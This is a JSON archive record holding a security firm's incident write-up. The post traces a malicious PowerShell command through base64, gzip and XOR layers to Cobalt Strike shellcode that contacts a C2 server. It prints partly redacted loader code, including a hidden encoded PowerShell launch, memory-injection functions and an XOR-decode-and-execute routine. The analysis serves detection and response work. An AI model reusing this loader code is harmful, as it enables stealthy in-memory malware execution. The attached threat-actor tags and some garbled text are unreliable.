{
    "id": "94316278-18b7-4ab7-a686-58346aeb3eb3",
    "created_at": "2023-01-12T15:08:42.534446Z",
    "updated_at": "2025-03-27T02:09:17.826986Z",
    "deleted_at": null,
    "sha1_hash": "b0cdf3e73449c6d4612bcff359bba9d534c3ca0d",
    "title": "2020-11-15 - From virus alert to PowerShell Encrypted Loader",
    "authors": "",
    "file_creation_date": "2022-05-29T01:19:01Z",
    "file_modification_date": "2022-05-29T01:19:01Z",
    "file_size": 1157207,
    "plain_text": "# From virus alert to PowerShell Encrypted Loader\n\n**trustnet.co.il/blog/virus-alert-to-powershell-encrypted-loader/**\n\n_November 15, 2020 | By Michael Wainshtain Technical Team Leader_\n\n**From virus alert to PowerShell Encrypted Loader**\n\n\nNovember 15, 2020\n\n\nIt was a Friday afternoon, attending my shift, doing regular SOC related activities, receiving multiple virus notifications and compliance alerts\nfrom here and there. In the interim, all of a sudden, we received a high severity alert – “most likely malicious PowerShell execution fired!”\n\nAs the affected device was a user workstation, as per our Incident Response Processes, our configured Security Orchestration, Automation,\nand Response (SOAR) solution executed a predefined playbook isolating the device. While the SOAR unrelentingly enriched the security\nincident, our Shift A responder commenced the manual investigation of the command line:\n\nLet’s break it down!\n\n**A few notes:\n\n1. In most cases, foreign code or scripts largely has a few layers of obfuscation or encryption and in some cases both – to avoid detection\n\nand response.\n2. We recommend using CyberChef and other techniques/tools you are familiar within your environment. In case, if you are unfamiliar with\n\nCyberChef, it’s high time – we would recommend you get acquainted with it.\n3. We have added ## before any comments I write in the code itself.\n\nThe First detection examined was PowerShell encoded command:\n\nLayer 1 – PowerShell Encoded Command:\n```\n\"powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8 <REDACTED>\ncAByAGUAcwBzAGkAbwBuAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAE0AbwBkAGUAXQA6ADoARABlAGMAbwBtAHAAcgBlAHMAcwApACkAKQAuAFIAZQBhAGQA\n\n```\n## We base64 decoded this and received the following ##\n\nLayer 2 – Gzip-stream with further command/instructions:\n\n\n-----\n\n```\n      j y (,\n[Convert]::FromBase64String(\"H4sIAAAAAAAAAK1XWW/iyBZ+Dr/CD5EAQdI<REDACTED>pwARo5L7jAwNlKUAzWCm6ElISo72/AS9R1K4DDgAA\"));I\n(New-Object IO.StreamReader (Ne\nw-Object IO.Compression.GzipStream ($s,[IO.Compression.CompressionMode]::Decompress))).Read…\n\n```\n\n## So, what’s happening here?\n\n## 1. Created a new IO memory stream.\n\n## 2. Populated $s variable with the base64 data (**think about a zip file without the physical file).\n\n## 3. Decoded the base 64 from $s variable.\n\n## 4. Invoked the code we got after decoding the base64 stream.\n\nLayer 3 – PowerShell code to inject foreign code into memory after decrypting:\n```\n$DoIt = @'function func_get_proc_address {\n\n```\n```\n  Param ($var_module, $var_procedure)  \n  $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache\n-And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n  $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]]\n@('System.Runtime.InteropServices.HandleRef', 'string'))\n  return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object\nSystem.Runtime.InteropServices.HandleRef((New-Object IntPtr),\n($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))}\n\n```\n## Functions that are related to memory, assemblies & memory injections\n```\n[Byte[]]$var_code =\n[System.Convert]::FromBase64String('38uqIyMjQ6rGE<REDACTED>PtB0KrHKV1CE/KJMG18tUiogp8e3lJoSYsissEPRCmCSvZZTnfOOkbbYjnZeK\n\n```\n## base64 code to populate data which threat actor does not want us to see in clear text ##\n\n```\nfor ($x = 0; $x -lt $var_code.Count; $x++) {  $var_code[$x] = $var_code[$x] -bxor 35}\n## Predefined XOR key to 'decrypt' the code before invoking it ##\n\n```\n```\nIf ([IntPtr]::size -eq 8) {  start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job\n\n```\n## execution function will invoke ‘THIS’ after the code was decrypted ##\n\nLayer 4 – XOR Encrypted Code that will be injected into memory:\n\n```\nüè....`.å1Òd.R<REDACTED>U.#..Ô¬.\n.User-Agent: Mozilla/4.0 (compatible; <REDACTED>; Trident/4.0; SLCC2; .NET CLR 2.0.50727)\n\n```\n```\n.R. <REDACTED>.ýÿÿ185.147. <REDACTED>\n\n```\n## Here we see and collect:\n\n## REDACTED User Agent IOC\n\n## REDACTED IP address IOC\n\n## The code that was loaded earlier into memory will go to the IP mentioned above and retrieve the next step\\stage\\file\\command from the C2\ncontrol server.\n\nPost a rapid triage and attribution, our responder concluded that this is a PowerShell stager with encoded and XOR encrypted shellcode\nrelated to Cobalt Strike.\n\nCobalt Strike is a pioneering toolkit used across multiple levels of intrusion to solve intruder’s difficulties such as post intrusion exploitation,\nstealth, and reconnaissance, and beaconing for C2C (command and control).\n\nIn general, such staged payloads may provide the privilege for an attacker to transfer trivial binaries to a targeted host retrieving the desired\npayload afterward, as we see in our case above. Cobalt Strike in a way is also one of the most preferred post-exploitation agents used by red\nteams and adversaries, to emulate or target long-term embedded threat actors in a corporate network.\n\n\n-----\n\ne you see Coba t St e you e o e t, e t e o e o t e o o g s go g o\n\n1. You currently amidst of an ongoing RED team engagement\n\nOR\n\n1. You have a threat actor in your environment\n\nWhen dealing with cyber crimes, an indication of Cobalt Strike beacons and implants usually happens in advanced phases in the attack chain.\nThe Cobalt Strike communication is generally seen next to the LAST stages of the attack.\n\nFor us, in this case, we had a very non-standard incident of a word document loading to Cobalt Strike – this is something that you don’t see\nevery day. This incident will be further examined and investigated by our team with the emphasis on understanding – who could have sent\nthese malicious documents, and especially why??\n\nGot anything to say?\n\n[Visit our blog or](https://www.trustnet.co.il/blog/) [Follow Us on Facebook Page for the latest news and insights on cybersecurity.](https://www.facebook.com/TrustnetTrustnet/)\n\n_Stay Safe with TrustNet!_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-11-15 - From virus alert to PowerShell Encrypted Loader.pdf"
    ],
    "report_names": [
        "2020-11-15 - From virus alert to PowerShell Encrypted Loader.pdf"
    ],
    "threat_actors": [
        {
            "id": "ce10c1bd-4467-45f9-af83-28fc88e35ca4",
            "created_at": "2022-10-25T15:50:23.458833Z",
            "updated_at": "2025-03-27T02:00:55.475188Z",
            "deleted_at": null,
            "main_name": "APT34",
            "aliases": null,
            "source_name": "MITRE:APT34",
            "tools": [
                "netstat",
                "Systeminfo",
                "PsExec",
                "SEASHARPEE",
                "Tasklist",
                "Mimikatz",
                "POWRUNER",
                "certutil"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cffb3c01-038f-4527-9cfd-57ad5a035c22",
            "created_at": "2022-10-25T15:50:23.38055Z",
            "updated_at": "2025-03-27T02:00:55.459558Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "COBALT GYPSY",
                "IRN2",
                "APT34",
                "Helix Kitten",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "EUROPIUM",
                "ITG13"
            ],
            "source_name": "MITRE:OilRig",
            "tools": [
                "ISMInjector",
                "RDAT",
                "Systeminfo",
                "QUADAGENT",
                "OopsIE",
                "Tasklist",
                "certutil",
                "ZeroCleare",
                "POWRUNER",
                "netstat",
                "ipconfig",
                "LaZagne",
                "BONDUPDATER",
                "SideTwist",
                "PsExec",
                "SEASHARPEE",
                "Mimikatz",
                "RGDoor",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "67709937-2186-4a32-b64c-a5693d40ac77",
            "created_at": "2023-01-06T13:46:38.495593Z",
            "updated_at": "2025-03-27T02:00:02.848206Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "IRN2",
                "Hazel Sandstorm",
                "EUROPIUM",
                "TA452",
                "Earth Simnavaz",
                "Cobalt Gypsy",
                "Crambus",
                "Helix Kitten",
                "APT 34",
                "APT34",
                "ATK40",
                "G0049",
                "Evasive Serpens",
                "Twisted Kitten"
            ],
            "source_name": "MISPGALAXY:OilRig",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536122,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1653787141,
    "ts_modification_date": 1653787141,
    "files": {
        "pdf": "https://archive.orkl.eu/b0cdf3e73449c6d4612bcff359bba9d534c3ca0d.pdf",
        "text": "https://archive.orkl.eu/b0cdf3e73449c6d4612bcff359bba9d534c3ca0d.txt",
        "img": "https://archive.orkl.eu/b0cdf3e73449c6d4612bcff359bba9d534c3ca0d.jpg"
    }
}